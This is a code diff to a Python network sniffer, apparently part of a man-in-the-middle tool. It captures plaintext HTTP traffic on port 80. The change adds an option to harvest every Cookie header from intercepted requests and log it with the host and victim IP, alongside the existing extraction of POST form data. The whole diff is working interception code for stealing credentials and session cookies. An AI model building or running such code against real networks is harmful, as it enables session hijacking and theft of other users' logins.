@@ -13,7 +13,7 @@ class HTTP_Sniffer(threading.Thread):
     Sniffs every HTTP Post packet, looking for interesting information.
     """
     
-    def __init__(self, exit_event, attributes, timeout):
+    def __init__(self, exit_event, attributes, get_every_cookie, timeout):
         """Creates the thread.
         
         Parameters:
@@ -30,16 +30,18 @@ class HTTP_Sniffer(threading.Thread):
         super().__init__()
         self.exit_event = exit_event
         self.timeout = timeout
+        self.get_every_cookie = get_every_cookie
+        self.packets_ids = []
+
         if attributes == "*" or attributes == "":
             self.relevant_attributes = "*"
         else:
             self.relevant_attributes = files.get_lines_from_file(attributes)
-            
-        self.packets_ids = []
-
+            if get_every_cookie:
+                self.relevant_attributes.append("cookie")
         
         
-    def _results(self, packets):
+    def _results(self, all_packets):
         """Shows the results of the sniffing, displaying the data obtained.
         
         Parameters:
@@ -47,24 +49,42 @@ class HTTP_Sniffer(threading.Thread):
                 packets that will be analyzed.
         """
         
+        #Filters HTTP Post packets
+        packets = [p for p in all_packets if b"POST" in p["Raw"].load]
+        
         if len(packets) > 0: loc = files.save_packets(packets)
         else: loc = None
         log.sniff.info("finish", len=len(packets), loc=loc)
         if verbose.sniff.results and len(packets) > 0:
             print(". Analyzing packets...\n")
             for i, packet in enumerate(packets):
-                    print("\033[94mPACKET " + str(i) + "\033[0m:")
-                    items = packet_utilities.get_relevant_data_from_http_packet(self.relevant_attributes, packet).items()
-                    for item in items:
-                        print(item[0] + ":", item[1])
-                    print()
+                print("\033[94mPACKET " + str(i) + "\033[0m:")
+                items = packet_utilities.get_relevant_data_from_http_packet(self.relevant_attributes, packet).items()
+                for item in items:
+                    print(item[0] + ":", item[1])
+                print()
         else:
             print()
+    
+    
+    def _get_cookies(self, packet):
+        cookies = packet_utilities.get_header_attribute_from_http_load("Cookie", packet.load).decode()
+        if cookies: return cookies[8:-2]
+        else: return ""
             
     def _handle_packet(self, packet):
         """Handles every HTTP post packet, logging when it is called."""
+        host = packet_utilities.get_host(packet["Raw"].load.decode('utf-8', "ignore"))
+        src=packet["IP"].src
         
-        log.sniff.info("packet_found", host=packet_utilities.get_host(packet["Raw"].load.decode('utf-8', "ignore")), src=packet["IP"].src)
+        if b"POST" in packet["Raw"].load:
+            log.sniff.info("packet_found", host=host, src=src)
+        
+        else:
+            cookies = self._get_cookies(packet)
+            if cookies:
+                log.sniff.info("cookies_found", host=host, src=src, cookies=cookies)
+        
         self.packets_ids.append((packet.ack, packet.seq))
         
     def run(self):
@@ -83,10 +103,10 @@ class HTTP_Sniffer(threading.Thread):
         #cuando llega un paquete como cuando se le hace forward. por ello se usa packets_ids para no repetir paquetes.
         
         log.sniff.info("start", timeout=self.timeout)
-        
+        #lfilter=lambda x: x.haslayer("Raw") and b"POST" in x["Raw"].load and not (x.ack, x.seq) in self.packets_ids, \
         try:
             packets = sniff(timeout=self.timeout, filter="tcp and dst port 80", \
-                            lfilter=lambda x: x.haslayer("Raw") and b"POST" in x["Raw"].load and not (x.ack, x.seq) in self.packets_ids, \
+                            lfilter=lambda x: x.haslayer("Raw") and not (x.ack, x.seq) in self.packets_ids, \
                             prn= self._handle_packet, \
                             stopperTimeout=3, stopper=self.exit_event.is_set)
         except PermissionError as err:
